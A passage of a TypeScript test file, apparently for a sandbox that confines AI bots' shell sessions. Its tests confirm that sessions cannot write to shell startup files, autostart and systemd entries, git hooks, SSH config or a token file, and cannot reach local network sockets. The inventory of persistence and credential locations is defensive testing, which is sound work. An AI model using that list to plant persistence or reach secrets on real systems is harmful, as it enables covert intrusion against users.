      mkdirSync(join(w.home, ".config", "fish", "conf.d"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "fish", "conf.d", "evil.fish")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "environment.d"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "environment.d", "evil.conf")}'`))).toBe(false);
      // Editors, package managers and the loginwindow plist: none of it is planted either.
      mkdirSync(join(w.home, ".vim"), { recursive: true });
      mkdirSync(join(w.home, ".config", "nvim"), { recursive: true });
      mkdirSync(join(w.home, ".gnupg"), { recursive: true });
      mkdirSync(join(w.home, ".config", "pip"), { recursive: true });
      mkdirSync(join(w.home, ".bun", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".cargo", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".oh-my-zsh", "custom"), { recursive: true });
      mkdirSync(join(w.home, "Library", "Preferences"), { recursive: true });
      mkdirSync(join(w.home, "Library", "Scripts"), { recursive: true });
      for (const f of [join(w.home, ".vimrc"), join(w.home, ".vim", "evil.vim"), join(w.home, ".config", "nvim", "evil.lua"), join(w.home, ".emacs"),
        join(w.home, ".gnupg", "gpg.conf"), join(w.home, ".config", "pip", "evil.conf"), join(w.home, ".bunfig.toml"),
        join(w.home, ".bun", "bin", "evil"), join(w.home, ".npmrc"), join(w.home, ".cargo", "bin", "evil"),
        join(w.home, ".cargo", "config.toml"), join(w.home, ".bash_aliases"), join(w.home, ".oh-my-zsh", "custom", "evil.zsh"),
        join(w.home, "Library", "Preferences", "com.apple.loginwindow.plist"), join(w.home, "Library", "Scripts", "evil.sh")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      // A hook in any repo under the home: planting fails too.
      mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
      expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
    } else {
      // The systemd user unit, an autostart entry, and the shell startup files: a bot's session plants none.
      expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "clover-core.service")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "autostart"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart", "evil.desktop")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "autostart-scripts"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart-scripts", "evil.sh")}'`))).toBe(false);
      for (const d of [join(w.home, ".config", "plasma-workspace", "env"), join(w.home, ".config", "plasma-workspace", "shutdown")]) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, "evil.sh")}'`))).toBe(false);
        expect(existsSync(join(d, "evil.sh"))).toBe(false);
      }
      for (const f of [".bashrc", ".bash_profile", ".zshrc", ".zprofile", ".bash_logout", ".pam_environment", ".xprofile"]) {
        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
      }
      expect(existsSync(join(w.home, ".bashrc"))).toBe(false);
      for (const d of [join(w.home, "bin"), join(w.home, ".local", "bin"), join(w.home, ".ssh")] ) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, d.endsWith(".ssh") ? "config" : "evil")}'`))).toBe(false);
      }
      // Editors, package managers, fish and the desktop entries: none of it is planted either.
      mkdirSync(join(w.home, ".vim"), { recursive: true });
      mkdirSync(join(w.home, ".config", "nvim"), { recursive: true });
      mkdirSync(join(w.home, ".gnupg"), { recursive: true });
      mkdirSync(join(w.home, ".config", "pip"), { recursive: true });
      mkdirSync(join(w.home, ".bun", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".cargo", "bin"), { recursive: true });
      mkdirSync(join(w.home, ".config", "fish", "conf.d"), { recursive: true });
      for (const f of [join(w.home, ".vimrc"), join(w.home, ".vim", "evil.vim"), join(w.home, ".config", "nvim", "evil.lua"),
        join(w.home, ".gnupg", "gpg.conf"), join(w.home, ".config", "pip", "evil.conf"), join(w.home, ".bunfig.toml"),
        join(w.home, ".npmrc"), join(w.home, ".cargo", "config.toml"), join(w.home, ".config", "fish", "conf.d", "evil.fish"),
        join(w.home, ".gitconfig"), join(w.home, ".config", "mimeapps.list")]) {
        expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
      }
      // A hook in any repo under the home: planting fails too.
      mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
      expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
    }
    // A fenced file that isn't there yet can't be made either.
    expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
    expect(existsSync(join(w.clover, "trust.json"))).toBe(false);
    expect(ok(await w.run(`echo x > '${join(w.outside, "c.txt")}'`))).toBe(false);
  }, 60_000);

  test("a bot's own session can write to its own scratch folder", async () => {
    const w = worldBot();
    const ownScratch = join(w.clover, "scratch", "luna");
    mkdirSync(ownScratch, { recursive: true });
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}' && echo z > '${join(ownScratch, "c.txt")}'`))).toBe(true);
  }, 60_000);

  test("no rename or removal of a folder that holds a fenced item, no hard link from one; a symlink is followed", async () => {
    const w = world();
    expect(ok(await w.run(`mv '${w.clover}' '${join(w.home, "moved")}'`))).toBe(false);
    expect(ok(await w.run(`mv '${join(w.clover, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
    // `rm -rf` can't even list the home's denied folders, so it exits 0 deleting nothing: the state is the assertion.
    await w.run(`rm -rf '${w.clover}'`);
    expect(existsSync(join(w.clover, "settings.json"))).toBe(true);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    expect(ok(await w.run(`ln '${join(w.clover, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
    expect(ok(await w.run(`ln -s '${join(w.clover, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
  }, 60_000);

  test("the run folder can't be read; non-ASCII names where Clover names things can't be made; the closed doors and the network are shut", async () => {
    const w = world();
    expect(ok(await w.run(`cat '${join(w.clover, "run", "token")}'`))).toBe(false);
    // Tool runners cannot read settings.json (Clover home is default-deny; only per-caller allows permit access).
    expect(ok(await w.run(`cat '${join(w.clover, "settings.json")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "öks")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "nötes")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "new")}'`))).toBe(false); // the home deny refuses every new name in it
    expect(ok(await w.run(`mkdir -p '${join(w.home, "project", "nötes")}'`))).toBe(true); // the user's own names elsewhere
    if (here === "macos") {
      expect(ok(await w.run("/usr/bin/open -g -j /nonexistent-lane-c"))).toBe(false);
      expect(ok(await w.run("/bin/launchctl print system >/dev/null"))).toBe(false);
    } else {
      expect(ok(await w.run(`test -z "$(ls -A /run/user/${process.getuid!()} 2>/dev/null)"`))).toBe(true); // the user's bus is hidden
      // The home takes no new names while the login unit isn't there, and the refusal says which and why.
      const held = await w.run(`echo x > '${join(w.home, "new-top-level.txt")}'`);
      expect(held.kind === "exited" && held.code !== 0).toBe(true);
      expect(held.kind === "exited" && held.stderr).toMatch(new RegExp(`${w.home.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} takes no new names under the fence, because \\S+ is fenced and isn't there yet; write in a subfolder of it, or ask the user`));
      // Its own pid namespace: a handful of its own processes, and not the daemon's.
      expect(ok(await w.run(`test $(ls /proc | grep -c '^[0-9]') -lt 10 && test ! -e /proc/${process.pid}/cmdline`))).toBe(true);
    }
  }, 60_000);

  test("no network: a listening loopback port and a Unix socket (as the daemon's) are both out of reach", async () => {
    const w = world();
    let tcpSeen = 0, unixSeen = 0;
    const tcp = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { open() { tcpSeen++; }, data() {} } });
    const sock = join(w.root, "d.sock");
    const unix = Bun.listen({ unix: sock, socket: { open() { unixSeen++; }, data() {} } });
    try {
      // Reachable from outside the sandbox, so a refusal inside is the sandbox's.
      const probe = (c: string) => `${process.execPath} -e '${c}'`;
      const tcpJs = `const s = await Bun.connect({ hostname: "127.0.0.1", port: ${tcp.port}, socket: { data() {} } }); s.end();`;
      const unixJs = `const s = await Bun.connect({ unix: ${JSON.stringify(sock)}, socket: { data() {} } }); s.end();`;
      expect(Bun.spawnSync([process.execPath, "-e", tcpJs]).exitCode).toBe(0);
      expect(ok(await w.run(probe(tcpJs)))).toBe(false);
      expect(ok(await w.run(probe(unixJs)))).toBe(false);
      await Bun.sleep(50);
      expect(tcpSeen).toBe(1); // only the check from outside
      expect(unixSeen).toBe(0);
    } finally { tcp.stop(true); unix.stop(true); }
  }, 60_000);

  test("bots' memory for runners: the owner's own conversations read and write it, every other runner is denied, nobody moves it", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}' && echo more >> '${b("luna", "memory", "MEMORY.md")}' && echo n > '${b("luna", "memory", "new.md")}' && ls '${b("luna", "memory")}'`, owner))).toBe(true);
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\n");
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${b("luna", "agents", "t.json")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, owner))).toBe(true); // the rest of its folder reads
    // Its files are its own to remove; the memory folder itself stays.
    expect(ok(await w.run(`mv '${b("luna", "memory")}' '${b("luna", "m2")}'`, owner))).toBe(false);
    expect(ok(await w.run(`rm -rf '${b("luna", "memory")}'`, owner))).toBe(false);
    expect(existsSync(b("luna", "memory"))).toBe(true);
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna'smore\n");
    expect(ok(await w.run(`mkdir -p '${b("future", "memory")}' && echo seed > '${b("future", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(existsSync(b("future"))).toBe(false);
    // A side thread reads and writes the same memory.
    expect(ok(await w.run(`echo side >> '${b("luna", "memory", "MEMORY.md")}'`, { caller: { kind: "session", sessionId: "t1", sessionKind: "side-thread", bot: "luna" } }))).toBe(true);
    // Everyone else: the user's coding session, the bot's own agent, another bot.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }, { caller: botCaller("sol", "s9") }]) {
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`echo x >> '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
    }
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\nside\n");
  }, 90_000);

  test("bots' folders for runners: its own bot's whole folder reads, every other runner sees none; transcripts hidden", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    const store = (...p: string[]) => join(w.clover, "sdk", "projects", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory"), join(w.clover, "sdk", "projects", "key")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(store("key", "s.jsonl"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}' && cat '${b("luna", "memory", "MEMORY.md")}' && cat '${b("luna", "memory", "MEMORY.md")}'`, owner))).toBe(true);
    expect(ok(await w.run(`ls '${b("luna")}'`, owner))).toBe(true);
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${store("key", "s2.jsonl")}'`, owner))).toBe(false);
    if (here === "linux") {
      // The tmpfs view holds only its own folder (the folder name is there, nothing of any other bot).
      expect(ok(await w.run(`test "$(ls -A '${b()}')" = luna`, owner))).toBe(true);
      // Its own outputs, scratch and routines read and write there too (made for it on first run).
      for (const d of [join(w.clover, "outputs", "s1"), join(w.clover, "scratch", "luna")]) mkdirSync(d, { recursive: true });
      expect(ok(await w.run(`echo o > '${join(w.clover, "outputs", "s1", "r.md")}' && echo s > '${join(w.clover, "scratch", "luna", "n.md")}' && echo r > '${join(w.clover, "routines", "luna", "m.md")}'`, owner))).toBe(true);
      // Its plugin-data doesn't open for it; another plugin's neither opens for anyone else.
      expect(ok(await w.run(`echo x > '${join(w.clover, "plugin-data", "tarot", "d.json")}'`, { caller: { kind: "plugin", pluginId: "tarot" } }))).toBe(true);
    } else {
      expect(ok(await w.run(`ls '${b()}'`, owner))).toBe(false); // a listing would name every bot: denied outright
    }
    // Everyone else, its own agent and a coding session included: no bot folder, and the store still hidden.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }]) {
      expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, who))).toBe(false);
      if (here === "linux") expect(ok(await w.run(`test -z "$(ls -A '${b()}')"`, who))).toBe(true);
      else expect(ok(await w.run(`ls '${b()}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, who))).toBe(false);
    }
  }, 90_000);

  test("ordinary work runs: a shell pipeline, git init and commit in the project, mktemp", async () => {
    const w = world();
    // Hooks are unwritable by design, so init installs no samples from the template dir; planting one is refused
    // (see the hooks probes above). The empty template keeps ordinary git work running.
    const r = await w.run(`printf 'a\\nb\\n' | sort -r | head -1 && mkdir -p empty-templates && GIT_TEMPLATE_DIR="$PWD/empty-templates" git init -q . && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x && git log --oneline | wc -l | tr -d ' ' && TMPDIR='${w.temp}' mktemp >/dev/null && echo done`);
    expect(r).toMatchObject({ kind: "exited", code: 0, shell: "sh" });
    expect(r.kind === "exited" && r.stdout).toBe("b\n1\ndone\n");
  }, 60_000);
});

const session = (sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "coding" });
const agent = (bot: string): Caller => ({ kind: "session", sessionId: "a1", sessionKind: "agent", bot });
